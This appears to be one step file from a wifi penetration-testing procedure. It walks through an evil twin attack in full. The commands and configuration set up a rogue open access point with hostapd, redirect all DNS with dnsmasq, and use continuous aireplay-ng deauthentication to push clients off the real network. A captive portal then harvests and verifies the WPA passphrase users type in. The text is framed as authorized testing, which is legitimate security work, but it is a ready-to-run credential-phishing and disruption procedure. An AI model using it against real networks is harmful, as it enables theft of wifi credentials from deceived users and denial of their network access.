---
step_id: wifi.phase2.evil_twin_walkthrough
procedure: wifi
stage: phase2
title: Evil twin attack (walkthrough)
estimated_minutes: 8
---

## What We Are Doing

The Evil Twin creates a rogue access point that mirrors the target network's SSID and signal characteristics. Clients are forced off the legitimate AP and connect to the rogue AP instead. A captive portal is served to harvest the WPA passphrase directly from users. This vector is particularly effective against enterprise-adjacent environments and is applicable regardless of the underlying encryption type.

## How

Step 1 — Prepare two wireless adapters

Adapter 1 (wlan0): Put into monitor mode for deauth injection.

Adapter 2 (wlan1): Remains in managed mode to host the rogue AP.

airmon-ng start wlan0

Step 2 — Create rogue AP configuration

Create hostapd.conf matching the target network:

interface=wlan1
ssid=[TARGET_SSID]
channel=[TARGET_CHANNEL]
hw_mode=g

Note: The rogue AP is deliberately open (no passphrase) — the captive portal handles credential capture.

hostapd hostapd.conf &

Step 3 — Configure DHCP and DNS interception

dnsmasq --interface=wlan1 --dhcp-range=192.168.99.2,192.168.99.50,255.255.255.0,12h --dhcp-option=3,192.168.99.1 --dhcp-option=6,192.168.99.1 --no-resolv --address=/#/192.168.99.1

Why: dnsmasq serves IP addresses to connecting clients and redirects all DNS queries to the tester's machine, ensuring the captive portal is displayed for any website the client attempts to visit.

Step 4 — Start captive portal

Host a convincing login page on port 80 mimicking the router's credential prompt. A minimal Python server can serve a custom HTML form that logs submitted credentials to a local file.

python3 -m http.server 80

Step 5 — Deauthenticate clients from the legitimate AP

aireplay-ng -0 0 -a [TARGET_BSSID] wlan0mon

The -0 0 flag sends continuous deauth frames. Clients will repeatedly fail to reconnect to the legitimate AP and eventually connect to the stronger rogue AP.

Why: Continuous deauth creates enough disruption that clients give up on the legitimate AP. The rogue AP, operating on the same channel with potentially stronger signal, becomes the easiest reconnection path.

Step 6 — Harvest and verify credentials

When a user submits the captive portal form, the passphrase is logged. Immediately verify the credential against the legitimate AP to confirm validity before concluding the test.

Data handed to Phase 3: Verified WPA passphrase, confirmed network access.
